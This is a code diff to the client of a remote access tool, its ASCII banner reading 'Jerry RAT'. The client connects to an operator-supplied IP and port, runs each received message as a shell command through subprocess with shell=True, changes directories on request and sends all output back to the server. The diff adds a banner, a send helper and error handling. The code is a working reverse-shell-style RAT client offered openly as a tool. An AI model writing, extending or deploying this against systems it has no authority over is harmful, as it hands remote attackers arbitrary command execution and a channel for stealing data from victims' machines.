@@ -3,6 +3,20 @@ import subprocess
 import os
 import sys
 
+def banner():
+    print('                                               ')
+    print('                                               ')
+    print('   ___                       ______  ___ _____ ')
+    print('  |_  |                      | ___ \/ _ |_   _|')
+    print('    | | ___ _ __ _ __ _   _  | |_/ / /_\ \| |  ')
+    print('    | |/ _ | \'__| \'__| | | | |    /|  _  || |')
+    print('/\__/ |  __| |  | |  | |_| | | |\ \| | | || |  ')
+    print('\____/ \___|_|  |_|   \__, | \_| \_\_| |_/\_/  ')
+    print('                       __/ |                   ')
+    print('                      |___/   by DFwJZ         ')
+    print('                                               ')
+    print('                                               ')
+
 class Client:
     """
     Represents a client for remote command execution.
@@ -43,15 +57,18 @@ class Client:
 
         try:
             directory = str(msg.split(' ')[1])
-            directory = os.path.expanduser(directory)
+            directory = os.path.expanduser(directory) # do nothing if $HOME is unknown
             os.chdir(directory)
             cur_dir = os.getcwd()
             print(f'[+] Changed to {cur_dir}')
-            self.sock.send(cur_dir.encode())
+            self.outbound_to_server(cur_dir.encode())
             print(f'[+] Sent new directory path to server - {cur_dir}')
         except IndexError:
             print('[-] No directory specified.')
-            self.sock.send(b'Error: no directory specified')
+            self.outbound_to_server(b'Error: no directory specified')
+        except FileNotFoundError:
+            print('[-] Invalid directory. Try again.')
+            self.outbound_to_server(b'Error: no directory found')
 
     def execute_command(self, msg: str):
         """
@@ -60,10 +77,10 @@ class Client:
 
         command = subprocess.Popen(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         output = command.stdout.read() + command.stderr.read()
-        if len(output) == 0:
+        if len(output) == 0: # Avoiding no cli stdout &stderr, eg. touch abc.file_extension
             print(f'output is: {output}')
             output = b'no actual return values'
-        self.sock.send(output)
+        self.outbound_to_server(output)
         print(f'[+] Sent command output to server - {output.decode()}')
 
     def wait_for_ack(self) -> bool:
@@ -79,6 +96,11 @@ class Client:
         print('[+] ACK received from server.')
         return True
     
+    def outbound_to_server(self, msg):
+        msg_to_send = str(msg).encode()
+        self.sock.send(msg_to_send)
+
+
     def run(self):
         """
         Main loop for receiving messages and processing them.
@@ -92,6 +114,7 @@ class Client:
                 msg = self.sock.recv(1024).decode()
 
                 if not msg or msg.lower() == 'exit':  # Client disconnected or server terminated the session
+                    print("[-] Server has initiated termination of the current session.")
                     break
 
                 self.process_message(msg)
@@ -107,7 +130,13 @@ class Client:
             self.sock.close()
 
 if __name__ == '__main__':
-    HOST_IP = sys.argv[1]
-    HOST_PORT = int(sys.argv[2])
-    client = Client(HOST_IP, HOST_PORT)
-    client.run()
+    try:
+        HOST_IP = sys.argv[1]
+        HOST_PORT = int(sys.argv[2])
+        banner()
+        client = Client(HOST_IP, HOST_PORT)
+        client.run()
+    except IndexError:
+        print('[-] Command line argument(s) missing. Please try again.')
+    except Exception as e:
+        print(f'{e}. Please try again.')
